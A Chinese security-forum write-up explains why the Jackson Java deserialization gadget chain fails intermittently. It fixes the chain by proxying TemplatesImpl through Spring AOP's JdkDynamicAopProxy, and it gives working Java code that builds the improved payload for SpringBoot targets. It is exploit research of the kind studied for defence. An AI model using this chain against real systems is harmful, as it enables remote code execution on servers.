

# 从JSON1链中学习处理JACKSON链的不稳定性 - 先知社区

从JSON1链中学习处理JACKSON链的不稳定性

* * *

## 简介

今天四月份的 AliyunCTF 2023 中公开了一条只依赖于 Jackson 这个 JSON 序列化库的原生反序列化利用链【1】。这条 JACKSON 链可以直接在无任何额外依赖的 SpringBoot 环境下使用，十分方便。但是，由于Jackson 获取类属性顺序的不稳定性，导致有时 JACKSON 链在触发 `getOutputProperties` 方法之前就报错了。本文参考著名反序列化利用工具 ysoserial【2】 中的 JSON1 链，在新添加一个 Spring AOP 依赖的基础上，对 JACKSON 链进行改进，使得 JACKSON 链在 SpringBoot 环境下可以稳定触发 `getOutputProperties` 方法。

## 关于 JACKSON 链

首先给出一段构造 JACKSON 链的（伪）代码，详细代码可以参考 AliyunCTF 2023 的 writeup【1】.

```plain
public static byte[] getJSON1(String cmd) throws Exception {
                // step 1
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
                // step 2
        POJONode node = new POJONode(makeTemplatesImpl(cmd));
                // step 3
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);

        return serialize(val);
    }
```

代码主要分三段，第一段是在 `com.fasterxml.jackson.databind.node.BaseJsonNode` 被类加载器加载前，使用 `javassist` 工具删除它的 `writeReplace` 方法。

第二段是构造一个 `TemplatesImpl` 类型的对象，然后用其构造一个 `POJONode` 类型的对象。

第三段是将这个 `POJONode` 类型的对象设置为 `BadAttributeValueExpException` 类型的对象的 `val` 字段的值，之后反序列化时触发 `POJONode` 类型的对象的 `toString` 方法。

JACKSON 链的原理是 `POJONode` 类型的对象的 `toString` 方法会触发用来构造 `POJONode` 类型的对象的 `TemplatesImpl` 类型的对象的所有 `getter` 方法，最终触发 `TemplatesImpl#getOutputProperties` ，导致任意类加载。

## JACKSON 链的不稳定性

有时在使用 JACKSON 链时，我们会遇到如下报错:

```plain
Caused by: java.lang.NullPointerException
    at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getStylesheetDOM(TemplatesImpl.java:450)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:483)
    at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:689)
    at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:774)
    ... 74 more
```

JACKSON 链触发过程中，在 `com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields` 中获取了之前找到的 `props`，且循环触发其 `getter`。

```plain
protected void serializeFields(Object bean, JsonGenerator gen, SerializerProvider provider)
        throws IOException
    {
        final BeanPropertyWriter[] props;
        if (_filteredProps != null && provider.getActiveView() != null) {
            props = _filteredProps;
        } else {
            props = _props;
        }
        int i = 0;
        try {
            for (final int len = props.length; i < len; ++i) {
                BeanPropertyWriter prop = props[i];
                if (prop != null) { // can have nulls in filtered list
                    prop.serializeAsField(bean, gen, provider);
                }
            }
            if (_anyGetterWriter != null) {
                _anyGetterWriter.getAndSerialize(bean, gen, provider);
            }
        } catch (Exception e) {
            String name = (i == props.length) ? "[anySetter]" : props[i].getName();
            wrapAndThrow(provider, e, bean, name);
        } catch (StackOverflowError e) {
                        ...
        }
    }
```

我使用 SpringBoot 2.7.5 搭建了一个测试项目，JDK 版本为 openjdk 1.8.20。

```plain
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

我们在 `com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields` 打上断点进行调试。

反序列化 JACKSON 链，断点断下。

通过调试可以看到 `BeanSerializerBase#serializeFields` 获取的三个 `props` 按顺序如下：

```plain
transletindex
stylesheetDOM
outputProperties
```

此时 `stylesheetDOM` 在 `outputProperties` 之前，所以 `getStylesheetDOM` 会先于 `getOutputProperties` 触发。当 `getStylesheetDOM` 方法先被触发时，由于 `_sdom` 成员为空，会导致空指针报错，反序列化攻击失败。

不过此处获取的顺序会有一定的不稳定性，有时 `outputProperties` 会在 `stylesheetDOM` 之前，这个时候反序列化攻击可以成功。

## 关于 JSON1 链

其实利用 JSON 序列化库触发所有 `getter` 方法并不鲜见。ysoserial【2】 中的 JSON1 链就利用了 `net.sf.json-lib` 这个 JSON 序列化库来触发 `getOutputProperties` 方法。

我们截取它的调用链研究一下：

```plain
/**
 *
 * A bit more convoluted example
 *
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 * java.lang.reflect.Method.invoke(Object, Object...)
 * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
 * org.springframework.aop.framework.JdkDynamicAopProxy.invoke(Object, Method, Object[])
 * $Proxy0.getOutputProperties()
 * java.lang.reflect.Method.invoke(Object, Object...)
 * org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(Method, Object, Object[])
 * org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtilsBean.getProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtils.getProperty(Object, String)
 * net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)
 * net.sf.json.JSONObject._fromBean(Object, JsonConfig)
 * net.sf.json.JSONObject.fromObject(Object, JsonConfig)
 * net.sf.json.JSONObject(AbstractJSON)._processValue(Object, JsonConfig)
 * net.sf.json.JSONObject._processValue(Object, JsonConfig)
 * net.sf.json.JSONObject.processValue(Object, JsonConfig)
 * net.sf.json.JSONObject.containsValue(Object, JsonConfig)
 * net.sf.json.JSONObject.containsValue(Object)
 * javax.management.openmbean.TabularDataSupport.containsValue(CompositeData)
 * javax.management.openmbean.TabularDataSupport.equals(Object)
 * java.util.HashMap<K,V>.putVal(int, K, V, boolean, boolean)
 * java.util.HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
```

从下往上看，可以看到最先有一段调用，从 `java.util.HashMap#readObject` 触发 `net.sf.json.JSONObject#containsValue`. 然后 `net.sf.json.JSONObject#defaultBeanProcessing` 尝试触发它包裹的对象的所有 `getter` 方法。这里用到了 commons-beanutils 这个库获取 `getter` 方法，然后反射触发。

按照 JACKSON 链的逻辑，这里可以，直接包裹一个 `TemplatesImpl` 类型的对象，然后触发其 `getOutputProperties` 方法。

但是这里 JSON1 链没有让 `JSONObject` 直接包裹一个 `TemplatesImpl` 类型的对象，而是包裹了一个代理类的对象 `cdsProxy`

```plain
Object payload = Gadgets.createTemplatesImpl(command);
                Class[] ifaces = new Class[]{Templates.class};
                // we need to make payload implement composite data
        // it's very likely that there are other proxy impls that could be used
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(payload);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
        InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
        final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
```

代理类的性质主要由其 `handler` 决定，我们研究一下这里用到的的 `handler`，也就是 `org.springframework.aop.framework.JdkDynamicAopProxy` 类

```plain
/**
     * Implementation of {@code InvocationHandler.invoke}.
     * <p>Callers will see exactly the exception thrown by the target,
     * unless a hook method throws an exception.
     */
    @Override
    @Nullable
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        Object oldProxy = null;
        boolean setProxyContext = false;

        TargetSource targetSource = this.advised.targetSource;
        Object target = null;

        try {
      ...
            // Get as late as possible to minimize the time we "own" the target,
            // in case it comes from a pool.
            target = targetSource.getTarget();
            Class<?> targetClass = (target != null ? target.getClass() : null);

            // Get the interception chain for this method.
            List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

            // Check whether we have any advice. If we don't, we can fall back on direct
            // reflective invocation of the target, and avoid creating a MethodInvocation.
            if (chain.isEmpty()) {
                // We can skip creating a MethodInvocation: just invoke the target directly
                // Note that the final invoker must be an InvokerInterceptor so we know it does
                // nothing but a reflective operation on the target, and no hot swapping or fancy proxying.
                Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);
                retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);
            }
            else {
                ...
            }
            ...
            }
            return retVal;
        }
        finally {
            ...
        }
    }
```

代码很长，简单概括一下，`JdkDynamicAopProxy` 类的 `advised` 成员是一个 `org.springframework.aop.framework.AdvisedSupport` 类型的对象，它的 `targetSource` 成员中保存了 `JdkDynamicAopProxy` 类代理的接口的实现类。

当代理类上的一个接口方法被调用时，这个 `handler` 就会尝试调用 `targetSource` 成员保存的实现类对象所实现的对应方法。

所以这里 JSON1 链是先使用 commons-beanutils 这个库获取代理类所有的 `getter` 方法，然后调用代理类的 `getter` 方法，触发 `JdkDynamicAopProxy` 类的 `invoke` 方法。

同时应该注意到，**当我们使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法**。

我们的目的应该是让代理类仅仅包含我们需要的方法 `getOutputProperties`。

查看 `TemplatesImpl` 实现的 `javax.xml.transform.Templates` 这个接口。

可以看到它只有一个 `getter` 方法，就是我们需要的 `getOutputProperties` 方法。

```plain
public interface Templates {

    Transformer newTransformer() throws TransformerConfigurationException;

    Properties getOutputProperties();
}
```

所以这里提取出 JSON1 链解决 JSON 序列化库类型依赖触发 `getter` 不稳定问题的思路如下：

1.  构造一个 `JdkDynamicAopProxy` 类型的对象，将 `TemplatesImpl` 类型的对象设置为 `targetSource`
2.  使用这个 `JdkDynamicAopProxy` 类型的对象构造一个代理类，代理 `javax.xml.transform.Templates` 接口
3.  JSON 序列化库只能从这个 `JdkDynamicAopProxy` 类型的对象上找到 `getOutputProperties` 方法
4.  通过代理类的 `invoke` 机制，触发 `TemplatesImpl#getOutputProperties` 方法，实现恶意类加载

这需要添加一个 Spring AOP 的依赖，但是在 SpringBoot 环境下默认是存在这个依赖的。

## JACKSON 链的修改

生成修改过的 JACKSON 链，代码如下：

```plain
public static byte[] getJSON2(String cmd) throws Exception {
                // step 1
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
                // step 2
        POJONode node = new POJONode(makeTemplatesImplAopProxy(cmd));
                // step 3
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);

        return serialize(val);
    }

    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(makeTemplatesImpl(cmd));
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
```

还是在 `com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields` 打下断点。

反序列化修改过的 JACKSON 链，通过调试可以看到只获取了一个 `props`：

```plain
outputProperties
```

此时 `getOutputProperties` 可以被稳定触发，解决了 JACKSON 链不稳定的问题。

## 总结

本文学习了 JSON1 链，使用 Spring AOP 中的 `JdkDynamicAopProxy` 作为 gadget，修改 JACKSON 链，将以随机顺序触发 `TemplatesImpl` 上的所有 `getter` , 转换成了只触发 `getOutputProperties` ，避免了 JACKSON 链的不稳定性，同时， JACKSON 链依然可以在 SpringBoot 环境下直接使用。

欢迎关注我们的微信公众号：御林安全

## 参考文章

\[1\] [https://xz.aliyun.com/t/12485](https://xz.aliyun.com/t/12485)

\[2\] [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
